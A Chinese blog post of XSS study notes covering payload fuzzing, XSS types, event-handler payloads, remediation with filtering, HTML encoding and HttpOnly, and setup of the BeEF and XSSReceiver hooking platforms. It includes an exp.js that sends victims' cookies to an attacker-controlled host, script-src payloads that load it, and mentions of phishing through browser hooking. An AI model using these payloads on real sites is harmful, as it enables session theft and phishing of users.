+<h3 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h3><h4 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h4><h5 id="1-输入一个任意字符串，看网站是否原样输出"><a href="#1-输入一个任意字符串，看网站是否原样输出" class="headerlink" title="1   输入一个任意字符串，看网站是否原样输出"></a>1   输入一个任意字符串，看网站是否原样输出</h5><h5 id="2-替换字符串为-xss-payload，-看是否触发弹窗，触发弹窗则证明有xss漏洞"><a href="#2-替换字符串为-xss-payload，-看是否触发弹窗，触发弹窗则证明有xss漏洞" class="headerlink" title="2  替换字符串为 xss payload， 看是否触发弹窗，触发弹窗则证明有xss漏洞"></a>2  替换字符串为 xss payload， 看是否触发弹窗，触发弹窗则证明有xss漏洞</h5><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<h4 id="方法2-随机复制10-20行-xss-payload"><a href="#方法2-随机复制10-20行-xss-payload" class="headerlink" title="方法2 随机复制10-20行 xss payload"></a>方法2 随机复制10-20行 xss payload</h4><p><a target="_blank" rel="noopener" href="https://github.com/TheKingOfDuck/fuzzDicts/blob/master/easyXssPayload/easyXssPayload.txt">https://github.com/TheKingOfDuck/fuzzDicts/blob/master/easyXssPayload/easyXssPayload.txt</a></p>
+<p>随机复制10-20行 xss payload，直接粘贴到目标网站的输入框中，看是否触发弹窗，以及触发的 弹窗对应的是哪个具体payload</p>
+<p>例：随意复制，粘贴到靶场，触发弹窗</p>
+<pre><code class="hljs http">&lt;script&gt;javascript:alert(354)&lt;/script\x0D
+&lt;script&gt;javascript:alert(355)&lt;/script\x0A
+&lt;script&gt;javascript:alert(356)&lt;/script\x0B
+&lt;script charset=&quot;\x22&gt;javascript:alert(357)&lt;/script&gt;
+&lt;!--\x3E&lt;img src=xxx:x onerror=javascript:alert(358)&gt; --&gt;
+--&gt;&lt;!-- ---&gt; &lt;img src=xxx:x onerror=javascript:alert(359)&gt; --&gt;
+--&gt;&lt;!-- --\x00&gt; &lt;img src=xxx:x onerror=javascript:alert(360)&gt; --&gt;
+--&gt;&lt;!-- --\x2361&gt; &lt;img src=xxx:x onerror=javascript:alert(361)&gt; --&gt;
+--&gt;&lt;!-- --\x3E&gt; &lt;img src=xxx:x onerror=javascript:alert(36
+&#x27;-alert(1)-&#x27;
+&quot;onmouseover=&quot;alert(1)</code></pre>
+
+<p>说明 359 处的payload可以使用</p>
+<pre><code class="hljs groovy">--&gt;&lt;!-- ---&gt; &lt;img src=<span class="hljs-attr">xxx:</span>x onerror=<span class="hljs-attr">javascript:</span>alert(<span class="hljs-number">359</span>)&gt; --&gt;</code></pre>
+
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><p>xss 只对<strong>当前网站的当前页面生效</strong>，是<strong>一次性</strong>的，<strong>会经过服务器</strong></p>
+<h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><p>xss 会经过服务器，且会<strong>被服务器保存到数据库中</strong>，当<strong>用户访问时自动触发</strong>，是<strong>持久性</strong>的</p>
+<h4 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h4><p>xss 只对<strong>当前网站的当前页面生效</strong>，是<strong>一次性</strong>的，<strong>不会经过服务器</strong>，是<strong>纯前端的漏洞</strong>。</p>
+<h3 id="常见的-playload"><a href="#常见的-playload" class="headerlink" title="常见的 playload"></a>常见的 playload</h3><h4 id="1-script-标签"><a href="#1-script-标签" class="headerlink" title="1 script 标签"></a>1 script 标签</h4><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<h4 id="2-a-标签"><a href="#2-a-标签" class="headerlink" title="2 a 标签"></a>2 a 标签</h4><p> <code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;XSS Test&lt;/a&gt;</code></p>
+<h4 id="3-事件类型"><a href="#3-事件类型" class="headerlink" title="3 事件类型"></a>3 事件类型</h4><p>JavaScript 事件 : <a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/dom-obj-event.html">https://www.runoob.com/jsref/dom-obj-event.html</a></p>
+<h5 id="oneload"><a href="#oneload" class="headerlink" title="oneload"></a>oneload</h5><p>在页面、图片、视频加载成功时触发 js 代码</p>
+<p><code>&lt;img src=&quot;[https://cdn.pixabay.com/photo/2025/11/28/16/07/frost-9983255_1280.jpg](https://cdn.pixabay.com/photo/2025/11/28/16/07/frost-9983255_1280.jpg)&quot; onload=&quot;alert(1)&quot;/&gt;</code></p>
+<h5 id="onerror"><a href="#onerror" class="headerlink" title="onerror"></a>onerror</h5><p>在页面、图片、视频加载失败时触发js 代码</p>
+<p><code>&lt;img src=&quot;xxx&quot; onerror=&quot;alert(1)&quot; /&gt;</code></p>
+<h5 id="onclick"><a href="#onclick" class="headerlink" title="onclick"></a>onclick</h5><p>当点击时触发 js 代码</p>
+<p><code>&lt;button onclick=&quot;alert(1)&quot;&gt; 点我！！！！ &lt;/button&gt;</code></p>
+<h5 id="oncopy"><a href="#oncopy" class="headerlink" title="oncopy"></a>oncopy</h5><p>当复制时触发</p>
+<p><code>&lt;p oncopy=&quot;alert(1)&quot;&gt; 复制✨我💗&lt;/p&gt;</code></p>
+<h5 id="onmouseover"><a href="#onmouseover" class="headerlink" title="onmouseover"></a>onmouseover</h5><p>当鼠标移动到 元素上时触发</p>
+<p><code>&lt;p onmouseover=&quot;alert(1)&quot;&gt;你过来鸭！😄&lt;/p&gt;</code></p>
+<h2 id="窃取cookie"><a href="#窃取cookie" class="headerlink" title="窃取cookie"></a>窃取cookie</h2><p>只有存储型的xss 才有意义</p>
+<h3 id="1-弹窗"><a href="#1-弹窗" class="headerlink" title="1 弹窗"></a>1 弹窗</h3><p>cookie 在浏览器中， 可以使用 js dom读取，document.cookie，对应的xss payload 如下</p>
+<p>攻击者：</p>
+<p> <code>&lt;script&gt;alert(document.cookie)&lt;script&gt;</code></p>
+<p>受害者：</p>
+<p>只是弹窗攻击对于受害者没啥影响，受害者能看到自己的cookie</p>
+<h3 id="2-HTTP-外带获取-Cookie-img-标签"><a href="#2-HTTP-外带获取-Cookie-img-标签" class="headerlink" title="2 HTTP 外带获取 Cookie (img 标签)"></a>2 HTTP 外带获取 Cookie (img 标签)</h3><h4 id="攻击者"><a href="#攻击者" class="headerlink" title="攻击者"></a>攻击者</h4><h4 id="1-编写-exp-js"><a href="#1-编写-exp-js" class="headerlink" title="1  编写 exp.js"></a>1  编写 exp.js</h4><pre><code class="hljs jsx"><span class="hljs-keyword">var</span> img = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;img&#x27;</span>); <span class="hljs-comment">// 在dom对象中创建一个img元素</span>
+img.<span class="hljs-property">width</span> = <span class="hljs-number">0</span>;
+img.<span class="hljs-property">height</span> = <span class="hljs-number">0</span>;
+img.<span class="hljs-property">src</span> = <span class="hljs-string">&quot;http://your_ip:your_port/1.png?&quot;</span> + <span class="hljs-built_in">escape</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);
+<span class="hljs-comment">// 定义img标签的src，也就是图片的源，由于img标签会请求源地址，所以可以进行http数据外带</span>
+<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(img);</code></pre>
+
+<p>⚠️： your_ip 和 your_port 必须选择受害者能够连接到的ip和端口，实际工作会选择任何人都能连接的云服务器</p>
+<h4 id="2-开启监听"><a href="#2-开启监听" class="headerlink" title="2  开启监听"></a>2  开启监听</h4><p><code>python -m http.server </code></p>
+<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="3-攻击者使用-payload-攻击目标网站-打-xss-漏洞"><a href="#3-攻击者使用-payload-攻击目标网站-打-xss-漏洞" class="headerlink" title="3  攻击者使用 payload 攻击目标网站  (打 xss 漏洞)"></a>3  攻击者使用 payload 攻击目标网站  (打 xss 漏洞)</h4><pre><code class="hljs plain">&lt;script type=&quot;text/javascript&quot; src=&quot;http://your_ip:your_port/exp.js&quot;&gt;&lt;/script&gt;
+&lt;script type=&quot;text/javascript&quot; src=&quot;http://192.168.79.129:8000/exp.js&quot;&gt;&lt;/script&gt;
+
+%3D 是 =</code></pre>
+
+<h4 id="4-攻击过程结束，耐心等待受害者上钩"><a href="#4-攻击过程结束，耐心等待受害者上钩" class="headerlink" title="4  攻击过程结束，耐心等待受害者上钩"></a>4  攻击过程结束，耐心等待受害者上钩</h4><h4 id="5-如果受害者上钩，攻击者即可在监听的HTTP日志中看到受害者的cookie"><a href="#5-如果受害者上钩，攻击者即可在监听的HTTP日志中看到受害者的cookie" class="headerlink" title="5  如果受害者上钩，攻击者即可在监听的HTTP日志中看到受害者的cookie"></a>5  如果受害者上钩，攻击者即可在监听的HTTP日志中看到受害者的cookie</h4><h4 id="受害者"><a href="#受害者" class="headerlink" title="受害者"></a>受害者</h4><h4 id="受害者登录自己的账号"><a href="#受害者登录自己的账号" class="headerlink" title="受害者登录自己的账号"></a>受害者登录自己的账号</h4><h3 id="3-拿到cookie后怎么办"><a href="#3-拿到cookie后怎么办" class="headerlink" title="3 拿到cookie后怎么办"></a>3 拿到cookie后怎么办</h3><h4 id="替换、刷新"><a href="#替换、刷新" class="headerlink" title="替换、刷新"></a>替换、刷新</h4><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><h4 id="1-过滤常见关键字"><a href="#1-过滤常见关键字" class="headerlink" title="1  过滤常见关键字"></a>1  过滤常见关键字</h4><p>比如过滤 js 标签 （一般很容易拦截网站的正常操作）</p>
+<p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<pre><code class="hljs php"><span class="hljs-variable">$keyword</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;keyword&#x27;</span>];
+
+<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;script&gt;/i&#x27;</span>, <span class="hljs-variable">$keyword</span>, <span class="hljs-variable">$matches</span>);
+<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$matches</span>) &gt; <span class="hljs-number">0</span>) &#123;
+  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;搜索结果：&lt;strong&gt;检测到攻击，拒绝访问&lt;/strong&gt;&quot;</span>;
+  <span class="hljs-keyword">exit</span>;
+&#125;
+
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;搜索结果：&lt;strong&gt;<span class="hljs-subst">$keyword</span>&lt;/strong&gt;&quot;</span>;</code></pre>
+
+<h4 id="2-HTML实体编码"><a href="#2-HTML实体编码" class="headerlink" title="2   HTML实体编码"></a>2   HTML实体编码</h4><p>HTML字符实体：  <a target="_blank" rel="noopener" href="https://www.runoob.com/html/html-entities.html">https://www.runoob.com/html/html-entities.html</a></p>
+<pre><code class="hljs php">&lt; 编码后 &amp;lt;
+&gt; 编码后 &amp;gt;</code></pre>
+
+<pre><code class="hljs php"><span class="hljs-variable">$keyword</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;keyword&#x27;</span>];
+<span class="hljs-variable">$keyword</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$keyword</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;搜索结果：&lt;strong&gt;<span class="hljs-subst">$keyword</span>&lt;/strong&gt;&quot;</span>;</code></pre>
+
+<pre><code class="hljs php">攻击者输入 &lt;script&gt;<span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-number">1</span>)&lt;/script&gt; 会变成 &amp;lt;script&amp;gt;<span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-number">1</span>)&amp;lt;/script&amp;gt;
+可以正常显示，但无法进行 xss 攻击</code></pre>
+
+<h4 id="3-浏览器-Cookie-属性"><a href="#3-浏览器-Cookie-属性" class="headerlink" title="3  浏览器 Cookie 属性"></a>3  浏览器 Cookie 属性</h4><pre><code class="hljs php">HttpOnly 的作用：禁止js读取cookie
+HttpOnly 不会修复 xss 漏洞，只是xss漏洞不能再窃取cookie，只能弹窗（降低xss漏洞的危害）</code></pre>
+
+<pre><code class="hljs php"><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;session.cookie_httponly&quot;</span>,<span class="hljs-number">1</span>);</code></pre>
+
+<h2 id="利用XSS-平台"><a href="#利用XSS-平台" class="headerlink" title="利用XSS-平台"></a>利用XSS-平台</h2><h2 id="beef"><a href="#beef" class="headerlink" title="beef"></a>beef</h2><p>源码：<a target="_blank" rel="noopener" href="https://github.com/beefproject/beef">https://github.com/beefproject/beef</a></p>
+<h3 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h3><h4 id="1-修改-beef-源代码-config-yaml-中的用户名和密码"><a href="#1-修改-beef-源代码-config-yaml-中的用户名和密码" class="headerlink" title="1  修改 beef 源代码 config.yaml 中的用户名和密码"></a>1  修改 beef 源代码 config.yaml 中的用户名和密码</h4><h4 id="2-构建镜像"><a href="#2-构建镜像" class="headerlink" title="2 构建镜像"></a>2 构建镜像</h4><p><code>docker build -t beef .</code></p>
+<h4 id="3-启动容器"><a href="#3-启动容器" class="headerlink" title="3 启动容器"></a>3 启动容器</h4><p><code>docker run -d -p 3000:3000 --name beef 镜像ID</code></p>
+<h4 id="4-访问-beef"><a href="#4-访问-beef" class="headerlink" title="4 访问 beef"></a>4 访问 beef</h4><p><code>http://192.168.79.129:3000/ui/authentication</code></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.79.129:3000/ui/panel">http://192.168.79.129:3000/ui/panel</a></p>
+<p>5 用户名和密码  可以在配置文件中看到</p>
+<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>hook.js:  <a target="_blank" rel="noopener" href="http://192.168.79.129:3000/hook.js">http://192.168.79.129:3000/hook.js</a></p>
+<p>把 hook.js 拼接为 xss 的 payload：</p>
+<h3 id="劫持浏览器"><a href="#劫持浏览器" class="headerlink" title="劫持浏览器"></a>劫持浏览器</h3><p>如果受害者触发 xss ，beef 就会上线目标的浏览器，泄露浏览器的信息</p>
+<p>commands 里面有非常多的功能，可以钓鱼、劫持目标的浏览器</p>
+<h3 id="flash-更新钓鱼"><a href="#flash-更新钓鱼" class="headerlink" title="flash 更新钓鱼"></a>flash 更新钓鱼</h3><p> 攻击者视角</p>
+<p>受害者视角</p>
+<h3 id="google-gmail-钓鱼"><a href="#google-gmail-钓鱼" class="headerlink" title="google gmail 钓鱼"></a>google gmail 钓鱼</h3><p>攻击者视角</p>
+<p>受害者视角</p>
+<h2 id="XSSReceiver"><a href="#XSSReceiver" class="headerlink" title="XSSReceiver"></a>XSSReceiver</h2><p><a target="_blank" rel="noopener" href="https://github.com/firesunCN/BlueLotus_XSSReceiver">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p>
+<h3 id="安装过程-1"><a href="#安装过程-1" class="headerlink" title="安装过程"></a>安装过程</h3><p>1 下载并启动容器</p>
+<pre><code class="hljs plain">docker build -t bule .
+docker run -d -p 10001:80 --name xssreceiver blue</code></pre>
+
+<p>2  把 config.php 复制到容器内部 (恢复密码为 bluelotus)</p>
+<p> <code>docker cp config.php xssreceiver:/app</code></p>
+<p>3  打开 <a target="_blank" rel="noopener" href="http://192.168.79.129:10001/login.php">http://192.168.79.129:10001/login.php</a> ，使用bluelotus密码登录</p>
+<h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><p>得到payload，使用 payload 攻击目标网站有xss漏洞的地方</p>
+<p><code>&lt;script src=&quot;http://192.168.79.129:10001/myjs/han.js&quot;&gt;&lt;/script&gt;</code></p>
+<h3 id="获取信息"><a href="#获取信息" class="headerlink" title="获取信息"></a>获取信息</h3><p>当受害者上钩后，XSSReceiver 平台即可看到目标浏览器的信息</p>
+
+      </div>
+
+      
+      <div class="article__tags reveal">
+        <span class="article__tags-label">标签</span>
+        <div class="tag-list">
+          
+            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/"><span>SQL注入</span></a>
+          
+            <a href="/tags/XSS/"><span>XSS</span></a>
+          
+            <a href="/tags/Getshell/"><span>Getshell</span></a>
+          
+        </div>
+      </div>
+      
+
+      <nav class="post-nav reveal" aria-label="前后文章">
+        
+          <a class="post-nav__prev" href="/csrf-and-file-upload/">
+            <span>← 上一篇</span>
+            <strong>CSRF 跨站请求伪造与文件上传漏洞</strong>
+          </a>
+        
+        
+          <a class="post-nav__next" href="/sql-injection-defense/">
+            <span>下一篇 →</span>
+            <strong>SQL 注入防御方案与利用进阶</strong>
+          </a>
+        
+      </nav>
+
+      
+      <div class="reward reveal">
+        <button type="button" class="reward__toggle" data-reward-toggle>
+          <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 2v20M2 7h20v10H2z"/><path d="M12 2a7 7 0 0 1 0 10M12 12a7 7 0 0 0 0 10"/></svg>
+          打赏
+        </button>
+        <div class="reward__box" data-reward-box>
+          <p class="reward__title">你的赏识是我前进的动力</p>
+          <div class="reward__qrs">
+            
+              <figure><img src="/medias/reward/wechat.png" alt="微信赞赏码" loading="lazy"><figcaption>微信</figcaption></figure>
+            
+            
+              <figure><img src="/medias/reward/alipay.jpg" alt="支付宝收款码" loading="lazy"><figcaption>支付宝</figcaption></figure>
+            
+          </div>
+        </div>
+      </div>
+      
+
+      
+      <div class="cbox reveal" id="comments">
+        <div class="cbox__head"><span class="cbox__title">评论</span></div>
+        <div id="gitalk-container"></div>
+      </div>
+      
+    </div>
+  </div>
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="site-footer__inner">
+    <div class="site-footer__id">
+      <img class="site-footer__avatar" src="/images/clay-avatar.svg" alt="swfk2154" loading="lazy">
+      <div class="site-footer__id-text">
+        <strong>swfk 的安全笔记</strong>
+        <span>AI 安全 / 网络安全 / 工程实践</span>
+      </div>
+    </div>
+    <div class="site-footer__links">
+      
+        <a href="https://github.com/swfk2154" target="_blank" rel="noopener noreferrer">
+          <svg viewBox="0 0 24 24" width="15" height="15" fill="currentColor" aria-hidden="true"><path d="M12 .5C5.65.5.5 5.65.5 12a11.5 11.5 0 0 0 7.86 10.92c.58.11.79-.25.79-.56v-2c-3.2.7-3.88-1.54-3.88-1.54-.53-1.33-1.28-1.69-1.28-1.69-1.04-.71.08-.7.08-.7 1.15.08 1.76 1.18 1.76 1.18 1.03 1.75 2.7 1.25 3.36.95.1-.74.4-1.25.72-1.54-2.55-.29-5.24-1.28-5.24-5.68 0-1.26.45-2.28 1.18-3.09-.12-.29-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.74 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.76.11 3.05.74.81 1.18 1.83 1.18 3.09 0 4.41-2.69 5.38-5.26 5.66.41.36.78 1.06.78 2.14v3.17c0 .31.21.68.8.56A11.5 11.5 0 0 0 23.5 12C23.5 5.65 18.35.5 12 .5z"/></svg>
+          GitHub
+        </a>
+      
+      
+      
+        <a href="/atom.xml">
+          <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 11a9 9 0 0 1 9 9"/><path d="M4 4a16 16 0 0 1 16 16"/><circle cx="5" cy="19" r="1.4"/></svg>
+          RSS
+        </a>
+      
+    </div>
+  </div>
+  <div class="site-footer__bar">
+    <span>© 2026 - 2026 swfk2154</span>
+    <span>由 <a href="https://hexo.io/" target="_blank" rel="noopener noreferrer">Hexo</a> 驱动 · Clay 主题</span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display:none">访客 <span id="busuanzi_value_site_uv"></span></span>
+      <span id="busuanzi_container_site_pv" style="display:none">浏览 <span id="busuanzi_value_site_pv"></span></span>
+    
+  </div>
+</footer>
+
+  
+<div class="search-overlay" id="search-overlay" hidden>
+  <div class="search-panel" role="dialog" aria-modal="true" aria-label="站内搜索">
+    <div class="search-bar">
+      <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.6-3.6"/></svg>
+      <input type="text" class="search-input" id="search-input" placeholder="搜索文章：标题 / 标签 / 正文…"
+             autocomplete="off" autocapitalize="off" spellcheck="false">
+      <button type="button" class="search-esc" data-search-close aria-label="关闭搜索">Esc</button>
+    </div>
+    <ul class="search-results" id="search-results"></ul>
+    <div class="search-hint">↑ ↓ 选择 · Enter 打开 · Esc 关闭</div>
+  </div>
+</div>
+
+  <button type="button" class="to-top" aria-label="回到顶部">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 19V5M6 11l6-6 6 6"/></svg>
+  </button>
+  
+
+<div class="music-player" data-music-player>
+  <button type="button" class="music-player__toggle" data-music-toggle aria-expanded="false" aria-controls="music-player-panel" aria-label="打开音乐播放器" title="音乐">
+    <span class="music-player__disc" aria-hidden="true">
+      <img class="music-player__disc-cover" data-music-cover alt="" hidden referrerpolicy="no-referrer">
+      <svg class="music-player__disc-note" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/></svg>
+    </span>
+    <span class="music-player__pulse" aria-hidden="true"><i></i><i></i><i></i></span>
+  </button>
+
+  <section class="music-player__panel" id="music-player-panel" data-music-panel aria-hidden="true">
+    <div class="music-player__panel-head">
+      <div class="music-player__head-copy">
+        <span class="music-player__eyebrow">MUSIC</span>
+        <h2>BGM</h2>
+      </div>
+      <button type="button" class="music-player__close" data-music-close aria-label="收起">&#215;</button>
+    </div>
+    
+    <div class="music-player__box">
+      
+      <div class="music-player__pane is-active" data-music-pane="0">
+        <div class="music-player__mount" data-ap-mount="0"></div>
+      </div>
+      
+      
+    </div>
+    <p class="music-player__foot">来自网易云音乐 · 点击列表选曲</p>
+  </section>
+  <script>window.__CLAY_MUSIC__ = {"apis":["https://api.injahow.cn/meting/?server=:server&type=:type&id=:id","https://api.i-meto.com/meting/api?server=:server&type=:type&id=:id"],"sources":[{"server":"netease","type":"playlist","id":"8792942606"}],"order":"list","listMaxHeight":"320px","autoplay":false};</script>
+</div>
+
+
+  
+<script>
+  window.__giscusConfig = {"enable":true,"repo":"swfk2154/swfk2154.github.io","repoId":"R_kgDORBu9qA","category":"Announcements","categoryId":"DIC_kwDORBu9qM4DEDSm","mapping":"pathname","reactionsEnabled":true,"inputPosition":"top","theme":"light","lang":"zh-CN"};
+</script>
+
+<script src="/js/clay.js"></script>
+<script src="/js/search.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+<script src="/js/music-loader.js"></script>
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+</body>
+</html>
